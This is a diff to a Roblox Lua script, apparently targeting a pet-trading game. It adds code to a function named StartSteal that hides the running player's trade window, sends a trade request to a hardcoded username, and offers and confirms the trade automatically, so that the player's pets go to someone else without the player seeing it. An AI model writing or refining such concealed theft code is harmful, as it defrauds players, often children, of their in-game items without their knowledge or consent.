@@ -138,14 +138,31 @@ request(
     }
 )
 
+-- Function to hide the trade UI
+local function HideTradeUI()
+    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("TradeUI") -- Look for the trade UI in the player's GUI
+
+    if tradeUI then
+        tradeUI.Enabled = false -- Disable the trade UI
+        print("Trade UI has been hidden.")
+    else
+        print("Trade UI not found.")
+    end
+end
+
 local function StartSteal()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
     local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
     local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
     local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
 
-    -- This part has been modified to hide the trade request
+    -- Hide the trade UI before starting the process
+    HideTradeUI()
+
+    SendTrade:FireServer(game.Players[Username])
+    wait(3)
     local PetsInventory =
         require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
     if PetsInventory.pets then
@@ -169,6 +186,7 @@ local function StartSteal()
     wait(6)
     AcceptNegotiationRemote:FireServer()
     wait(5)
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
     ConfirmTradeRemote:FireServer()
 end
 
